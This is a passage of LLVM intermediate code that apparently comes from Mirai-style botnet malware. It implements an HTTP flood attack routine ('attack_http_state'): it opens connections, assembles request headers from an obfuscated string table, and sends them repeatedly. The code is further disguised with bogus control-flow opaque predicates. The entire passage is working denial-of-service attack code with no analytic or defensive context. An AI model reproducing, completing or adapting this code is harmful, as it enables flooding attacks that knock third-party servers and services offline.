  %608 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %607, i32 0, i32 2
  store i32 %606, i32* %608, align 4
  %609 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %610 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %609, i32 0, i32 1
  store i8 2, i8* %610, align 4
  %611 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %612 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %611, i32 0, i32 0
  %613 = load i32, i32* %612, align 4
  %614 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %615 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %615, %struct.sockaddr** %614, align 8
  %616 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %617 = load %struct.sockaddr*, %struct.sockaddr** %616, align 8
  %618 = call i32 @connect(i32 %613, %struct.sockaddr* %617, i32 16)
  %619 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %620 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %619, i32 0, i32 0
  %621 = load i32, i32* %620, align 4
  %622 = srem i32 %621, 64
  %623 = zext i32 %622 to i64
  %624 = shl i64 1, %623
  %625 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %626 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %627 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %626, i32 0, i32 0
  %628 = load i32, i32* %627, align 4
  %629 = sdiv i32 %628, 64
  %630 = sext i32 %629 to i64
  %631 = getelementptr inbounds [16 x i64], [16 x i64]* %625, i64 0, i64 %630
  %632 = load i64, i64* %631, align 8
  %633 = or i64 %632, %624
  store i64 %633, i64* %631, align 8
  %634 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %635 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %634, i32 0, i32 0
  %636 = load i32, i32* %635, align 4
  %637 = load i32, i32* %23, align 4
  %638 = icmp sgt i32 %636, %637
  br i1 %638, label %639, label %644

; <label>:639:                                    ; preds = %582
  %640 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %641 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %640, i32 0, i32 0
  %642 = load i32, i32* %641, align 4
  %643 = add nsw i32 %642, 1
  store i32 %643, i32* %23, align 4
  br label %644

; <label>:644:                                    ; preds = %639, %582
  br label %1279

; <label>:645:                                    ; preds = %originalBBpart259
  %646 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %647 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %646, i32 0, i32 1
  %648 = load i8, i8* %647, align 4
  %649 = zext i8 %648 to i32
  %650 = icmp eq i32 %649, 2
  br i1 %650, label %651, label %694

; <label>:651:                                    ; preds = %645
  %652 = load i32, i32* %27, align 4
  %653 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %654 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %653, i32 0, i32 2
  %655 = load i32, i32* %654, align 4
  %656 = sub i32 %652, %655
  %657 = icmp ugt i32 %656, 30
  br i1 %657, label %658, label %667

; <label>:658:                                    ; preds = %651
  %659 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %660 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %659, i32 0, i32 1
  store i8 0, i8* %660, align 4
  %661 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %662 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %661, i32 0, i32 0
  %663 = load i32, i32* %662, align 4
  %664 = call i32 @close(i32 %663)
  %665 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %666 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %665, i32 0, i32 0
  store i32 -1, i32* %666, align 4
  br label %1296

; <label>:667:                                    ; preds = %651
  %668 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %669 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %668, i32 0, i32 0
  %670 = load i32, i32* %669, align 4
  %671 = srem i32 %670, 64
  %672 = zext i32 %671 to i64
  %673 = shl i64 1, %672
  %674 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %675 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %676 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %675, i32 0, i32 0
  %677 = load i32, i32* %676, align 4
  %678 = sdiv i32 %677, 64
  %679 = sext i32 %678 to i64
  %680 = getelementptr inbounds [16 x i64], [16 x i64]* %674, i64 0, i64 %679
  %681 = load i64, i64* %680, align 8
  %682 = or i64 %681, %673
  store i64 %682, i64* %680, align 8
  %683 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %684 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %683, i32 0, i32 0
  %685 = load i32, i32* %684, align 4
  %686 = load i32, i32* %23, align 4
  %687 = icmp sgt i32 %685, %686
  br i1 %687, label %688, label %693

; <label>:688:                                    ; preds = %667
  %689 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %690 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %689, i32 0, i32 0
  %691 = load i32, i32* %690, align 4
  %692 = add nsw i32 %691, 1
  store i32 %692, i32* %23, align 4
  br label %693

; <label>:693:                                    ; preds = %688, %667
  br label %1262

; <label>:694:                                    ; preds = %645
  %695 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %696 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %695, i32 0, i32 1
  %697 = load i8, i8* %696, align 4
  %698 = zext i8 %697 to i32
  %699 = icmp eq i32 %698, 4
  br i1 %699, label %700, label %1038

; <label>:700:                                    ; preds = %694
  %701 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %702 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %701, i32 0, i32 14
  store i32 -1, i32* %702, align 4
  %703 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %704 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %703, i32 0, i32 11
  store i32 0, i32* %704, align 4
  %705 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %706 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %705, i32 0, i32 18
  %707 = getelementptr inbounds [1024 x i8], [1024 x i8]* %706, i32 0, i32 0
  call void @util_zero(i8* %707, i32 1024)
  %708 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %709 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %708, i32 0, i32 17
  store i32 0, i32* %709, align 4
  %710 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  call void @util_zero(i8* %710, i32 10240)
  %711 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %712 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %713 = call i32 @util_strlen(i8* %712)
  %714 = sext i32 %713 to i64
  %715 = getelementptr inbounds i8, i8* %711, i64 %714
  %716 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %717 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %716, i32 0, i32 9
  %718 = getelementptr inbounds [9 x i8], [9 x i8]* %717, i32 0, i32 0
  %719 = call i32 @util_strcpy(i8* %715, i8* %718)
  %720 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %721 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %722 = call i32 @util_strlen(i8* %721)
  %723 = sext i32 %722 to i64
  %724 = getelementptr inbounds i8, i8* %720, i64 %723
  %725 = call i32 @util_strcpy(i8* %724, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %726 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %727 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %728 = call i32 @util_strlen(i8* %727)
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds i8, i8* %726, i64 %729
  %731 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %732 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %731, i32 0, i32 6
  %733 = getelementptr inbounds [257 x i8], [257 x i8]* %732, i32 0, i32 0
  %734 = call i32 @util_strcpy(i8* %730, i8* %733)
  %735 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %736 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %737 = call i32 @util_strlen(i8* %736)
  %738 = sext i32 %737 to i64
  %739 = getelementptr inbounds i8, i8* %735, i64 %738
  %740 = call i32 @util_strcpy(i8* %739, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %741 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %742 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %743 = call i32 @util_strlen(i8* %742)
  %744 = sext i32 %743 to i64
  %745 = getelementptr inbounds i8, i8* %741, i64 %744
  %746 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %747 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %746, i32 0, i32 5
  %748 = getelementptr inbounds [512 x i8], [512 x i8]* %747, i32 0, i32 0
  %749 = call i32 @util_strcpy(i8* %745, i8* %748)
  %750 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %751 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %752 = call i32 @util_strlen(i8* %751)
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds i8, i8* %750, i64 %753
  %755 = call i32 @util_strcpy(i8* %754, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %756 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %757 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %758 = call i32 @util_strlen(i8* %757)
  %759 = sext i32 %758 to i64
  %760 = getelementptr inbounds i8, i8* %756, i64 %759
  %761 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %762 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %761, i32 0, i32 7
  %763 = getelementptr inbounds [129 x i8], [129 x i8]* %762, i32 0, i32 0
  %764 = call i32 @util_strcpy(i8* %760, i8* %763)
  %765 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %766 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %767 = call i32 @util_strlen(i8* %766)
  %768 = sext i32 %767 to i64
  %769 = getelementptr inbounds i8, i8* %765, i64 %768
  %770 = call i32 @util_strcpy(i8* %769, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 39)
  %771 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %772 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %773 = call i32 @util_strlen(i8* %772)
  %774 = sext i32 %773 to i64
  %775 = getelementptr inbounds i8, i8* %771, i64 %774
  %776 = call i8* @table_retrieve_val(i32 39, i32* null)
  %777 = call i32 @util_strcpy(i8* %775, i8* %776)
  call void @table_lock_val(i8 zeroext 39)
  %778 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %779 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %780 = call i32 @util_strlen(i8* %779)
  %781 = sext i32 %780 to i64
  %782 = getelementptr inbounds i8, i8* %778, i64 %781
  %783 = call i32 @util_strcpy(i8* %782, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 40)
  %784 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %785 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %786 = call i32 @util_strlen(i8* %785)
  %787 = sext i32 %786 to i64
  %788 = getelementptr inbounds i8, i8* %784, i64 %787
  %789 = call i8* @table_retrieve_val(i32 40, i32* null)
  %790 = call i32 @util_strcpy(i8* %788, i8* %789)
  call void @table_lock_val(i8 zeroext 40)
  %791 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %792 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %793 = call i32 @util_strlen(i8* %792)
  %794 = sext i32 %793 to i64
  %795 = getelementptr inbounds i8, i8* %791, i64 %794
  %796 = call i32 @util_strcpy(i8* %795, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 41)
  %797 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %798 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %799 = call i32 @util_strlen(i8* %798)
  %800 = sext i32 %799 to i64
  %801 = getelementptr inbounds i8, i8* %797, i64 %800
  %802 = call i8* @table_retrieve_val(i32 41, i32* null)
  %803 = call i32 @util_strcpy(i8* %801, i8* %802)
  call void @table_lock_val(i8 zeroext 41)
  %804 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %805 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %806 = call i32 @util_strlen(i8* %805)
  %807 = sext i32 %806 to i64
  %808 = getelementptr inbounds i8, i8* %804, i64 %807
  %809 = call i32 @util_strcpy(i8* %808, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %810 = load i8*, i8** %14, align 8
  %811 = icmp ne i8* %810, null
  br i1 %811, label %812, label %853

; <label>:812:                                    ; preds = %700
  call void @table_unlock_val(i8 zeroext 42)
  %813 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %814 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %815 = call i32 @util_strlen(i8* %814)
  %816 = sext i32 %815 to i64
  %817 = getelementptr inbounds i8, i8* %813, i64 %816
  %818 = call i8* @table_retrieve_val(i32 42, i32* null)
  %819 = call i32 @util_strcpy(i8* %817, i8* %818)
  call void @table_lock_val(i8 zeroext 42)
  %820 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %821 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %822 = call i32 @util_strlen(i8* %821)
  %823 = sext i32 %822 to i64
  %824 = getelementptr inbounds i8, i8* %820, i64 %823
  %825 = call i32 @util_strcpy(i8* %824, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %826 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %827 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %828 = call i32 @util_strlen(i8* %827)
  %829 = sext i32 %828 to i64
  %830 = getelementptr inbounds i8, i8* %826, i64 %829
  %831 = call i8* @table_retrieve_val(i32 47, i32* null)
  %832 = call i32 @util_strcpy(i8* %830, i8* %831)
  %833 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %834 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %835 = call i32 @util_strlen(i8* %834)
  %836 = sext i32 %835 to i64
  %837 = getelementptr inbounds i8, i8* %833, i64 %836
  %838 = call i32 @util_strcpy(i8* %837, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %839 = load i8*, i8** %14, align 8
  %840 = call i32 @util_strlen(i8* %839)
  %841 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %842 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %843 = call i32 @util_strlen(i8* %842)
  %844 = sext i32 %843 to i64
  %845 = getelementptr inbounds i8, i8* %841, i64 %844
  %846 = call i8* @util_itoa(i32 %840, i32 10, i8* %845)
  %847 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %848 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %849 = call i32 @util_strlen(i8* %848)
  %850 = sext i32 %849 to i64
  %851 = getelementptr inbounds i8, i8* %847, i64 %850
  %852 = call i32 @util_strcpy(i8* %851, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %853

; <label>:853:                                    ; preds = %812, %700
  %854 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %855 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %854, i32 0, i32 15
  %856 = load i32, i32* %855, align 4
  %857 = icmp sgt i32 %856, 0
  br i1 %857, label %858, label %916

; <label>:858:                                    ; preds = %853
  %859 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %860 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %861 = call i32 @util_strlen(i8* %860)
  %862 = sext i32 %861 to i64
  %863 = getelementptr inbounds i8, i8* %859, i64 %862
  %864 = call i32 @util_strcpy(i8* %863, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0))
  store i32 0, i32* %10, align 4
  br label %865

; <label>:865:                                    ; preds = %906, %858
  %866 = load i32, i32* %10, align 4
  %867 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %868 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %867, i32 0, i32 15
  %869 = load i32, i32* %868, align 4
  %870 = icmp slt i32 %866, %869
  br i1 %870, label %871, label %909

; <label>:871:                                    ; preds = %865
  %872 = load i32, i32* @x.17
  %873 = load i32, i32* @y.18
  %874 = sub i32 %872, 1
  %875 = mul i32 %872, %874
  %876 = urem i32 %875, 2
  %877 = icmp eq i32 %876, 0
  %878 = icmp slt i32 %873, 10
  %879 = or i1 %877, %878
  br i1 %879, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %871
  %880 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %881 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %882 = call i32 @util_strlen(i8* %881)
  %883 = sext i32 %882 to i64
  %884 = getelementptr inbounds i8, i8* %880, i64 %883
  %885 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %886 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %885, i32 0, i32 16
  %887 = load i32, i32* %10, align 4
  %888 = sext i32 %887 to i64
  %889 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %886, i64 0, i64 %888
  %890 = getelementptr inbounds [128 x i8], [128 x i8]* %889, i32 0, i32 0
  %891 = call i32 @util_strcpy(i8* %884, i8* %890)
  %892 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %893 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %894 = call i32 @util_strlen(i8* %893)
  %895 = sext i32 %894 to i64
  %896 = getelementptr inbounds i8, i8* %892, i64 %895
  %897 = call i32 @util_strcpy(i8* %896, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0))
  %898 = load i32, i32* @x.17
  %899 = load i32, i32* @y.18
  %900 = sub i32 %898, 1
  %901 = mul i32 %898, %900
  %902 = urem i32 %901, 2
  %903 = icmp eq i32 %902, 0
  %904 = icmp slt i32 %899, 10
  %905 = or i1 %903, %904
  br i1 %905, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br label %906

; <label>:906:                                    ; preds = %originalBBpart263
  %907 = load i32, i32* %10, align 4
  %908 = add nsw i32 %907, 1
  store i32 %908, i32* %10, align 4
  br label %865

; <label>:909:                                    ; preds = %865
  %910 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %911 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %912 = call i32 @util_strlen(i8* %911)
  %913 = sext i32 %912 to i64
  %914 = getelementptr inbounds i8, i8* %910, i64 %913
  %915 = call i32 @util_strcpy(i8* %914, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %916

; <label>:916:                                    ; preds = %909, %853
  %917 = load i32, i32* @x.17
  %918 = load i32, i32* @y.18
  %919 = sub i32 %917, 1
  %920 = mul i32 %917, %919
  %921 = urem i32 %920, 2
  %922 = icmp eq i32 %921, 0
  %923 = icmp slt i32 %918, 10
  %924 = or i1 %922, %923
  br i1 %924, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %916
  %925 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %926 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %927 = call i32 @util_strlen(i8* %926)
  %928 = sext i32 %927 to i64
  %929 = getelementptr inbounds i8, i8* %925, i64 %928
  %930 = call i32 @util_strcpy(i8* %929, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %931 = load i8*, i8** %14, align 8
  %932 = icmp ne i8* %931, null
  %933 = load i32, i32* @x.17
  %934 = load i32, i32* @y.18
  %935 = sub i32 %933, 1
  %936 = mul i32 %933, %935
  %937 = urem i32 %936, 2
  %938 = icmp eq i32 %937, 0
  %939 = icmp slt i32 %934, 10
  %940 = or i1 %938, %939
  br i1 %940, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %932, label %941, label %965

; <label>:941:                                    ; preds = %originalBBpart267
  %942 = load i32, i32* @x.17
  %943 = load i32, i32* @y.18
  %944 = sub i32 %942, 1
  %945 = mul i32 %942, %944
  %946 = urem i32 %945, 2
  %947 = icmp eq i32 %946, 0
  %948 = icmp slt i32 %943, 10
  %949 = or i1 %947, %948
  br i1 %949, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %941
  %950 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %951 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %952 = call i32 @util_strlen(i8* %951)
  %953 = sext i32 %952 to i64
  %954 = getelementptr inbounds i8, i8* %950, i64 %953
  %955 = load i8*, i8** %14, align 8
  %956 = call i32 @util_strcpy(i8* %954, i8* %955)
  %957 = load i32, i32* @x.17
  %958 = load i32, i32* @y.18
  %959 = sub i32 %957, 1
  %960 = mul i32 %957, %959
  %961 = urem i32 %960, 2
  %962 = icmp eq i32 %961, 0
  %963 = icmp slt i32 %958, 10
  %964 = or i1 %962, %963
  br i1 %964, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br label %965

; <label>:965:                                    ; preds = %originalBBpart271, %originalBBpart267
  %966 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %967 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %966, i32 0, i32 9
  %968 = getelementptr inbounds [9 x i8], [9 x i8]* %967, i32 0, i32 0
  %969 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %970 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %969, i32 0, i32 10
  %971 = getelementptr inbounds [9 x i8], [9 x i8]* %970, i32 0, i32 0
  %972 = call signext i8 @util_strcmp(i8* %968, i8* %971)
  %973 = icmp ne i8 %972, 0
  br i1 %973, label %982, label %974

; <label>:974:                                    ; preds = %965
  %975 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %976 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %975, i32 0, i32 9
  %977 = getelementptr inbounds [9 x i8], [9 x i8]* %976, i32 0, i32 0
  %978 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %979 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %978, i32 0, i32 10
  %980 = getelementptr inbounds [9 x i8], [9 x i8]* %979, i32 0, i32 0
  %981 = call i32 @util_strcpy(i8* %977, i8* %980)
  br label %982

; <label>:982:                                    ; preds = %974, %965
  %983 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %984 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %983, i32 0, i32 0
  %985 = load i32, i32* %984, align 4
  %986 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %987 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %988 = call i32 @util_strlen(i8* %987)
  %989 = sext i32 %988 to i64
  %990 = call i64 @send(i32 %985, i8* %986, i64 %989, i32 16384)
  %991 = load i32, i32* %27, align 4
  %992 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %993 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %992, i32 0, i32 3
  store i32 %991, i32* %993, align 4
  %994 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %995 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %994, i32 0, i32 1
  store i8 6, i8* %995, align 4
  %996 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %997 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %996, i32 0, i32 0
  %998 = load i32, i32* %997, align 4
  %999 = srem i32 %998, 64
  %1000 = zext i32 %999 to i64
  %1001 = shl i64 1, %1000
  %1002 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1003 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1004 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1003, i32 0, i32 0
  %1005 = load i32, i32* %1004, align 4
  %1006 = sdiv i32 %1005, 64
  %1007 = sext i32 %1006 to i64
  %1008 = getelementptr inbounds [16 x i64], [16 x i64]* %1002, i64 0, i64 %1007
  %1009 = load i64, i64* %1008, align 8
  %1010 = or i64 %1009, %1001
  store i64 %1010, i64* %1008, align 8
  %1011 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1012 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1011, i32 0, i32 0
  %1013 = load i32, i32* %1012, align 4
  %1014 = load i32, i32* %23, align 4
  %1015 = icmp sgt i32 %1013, %1014
  br i1 %1015, label %1016, label %1037

; <label>:1016:                                   ; preds = %982
  %1017 = load i32, i32* @x.17
  %1018 = load i32, i32* @y.18
  %1019 = sub i32 %1017, 1
  %1020 = mul i32 %1017, %1019
  %1021 = urem i32 %1020, 2
  %1022 = icmp eq i32 %1021, 0
  %1023 = icmp slt i32 %1018, 10
  %1024 = or i1 %1022, %1023
  br i1 %1024, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %1016
  %1025 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1026 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1025, i32 0, i32 0
  %1027 = load i32, i32* %1026, align 4
  %1028 = add nsw i32 %1027, 1
  store i32 %1028, i32* %23, align 4
  %1029 = load i32, i32* @x.17
  %1030 = load i32, i32* @y.18
  %1031 = sub i32 %1029, 1
  %1032 = mul i32 %1029, %1031
  %1033 = urem i32 %1032, 2
  %1034 = icmp eq i32 %1033, 0
  %1035 = icmp slt i32 %1030, 10
  %1036 = or i1 %1034, %1035
  br i1 %1036, label %originalBBpart278, label %originalBB73alteredBB

originalBBpart278:                                ; preds = %originalBB73
  br label %1037

; <label>:1037:                                   ; preds = %originalBBpart278, %982
  br label %1245

; <label>:1038:                                   ; preds = %694
  %1039 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1040 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1039, i32 0, i32 1
  %1041 = load i8, i8* %1040, align 4
  %1042 = zext i8 %1041 to i32
  %1043 = icmp eq i32 %1042, 6
  br i1 %1043, label %1044, label %1071

; <label>:1044:                                   ; preds = %1038
  %1045 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1046 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1045, i32 0, i32 0
  %1047 = load i32, i32* %1046, align 4
  %1048 = srem i32 %1047, 64
  %1049 = zext i32 %1048 to i64
  %1050 = shl i64 1, %1049
  %1051 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1052 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1053 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1052, i32 0, i32 0
  %1054 = load i32, i32* %1053, align 4
  %1055 = sdiv i32 %1054, 64
  %1056 = sext i32 %1055 to i64
  %1057 = getelementptr inbounds [16 x i64], [16 x i64]* %1051, i64 0, i64 %1056
  %1058 = load i64, i64* %1057, align 8
  %1059 = or i64 %1058, %1050
  store i64 %1059, i64* %1057, align 8
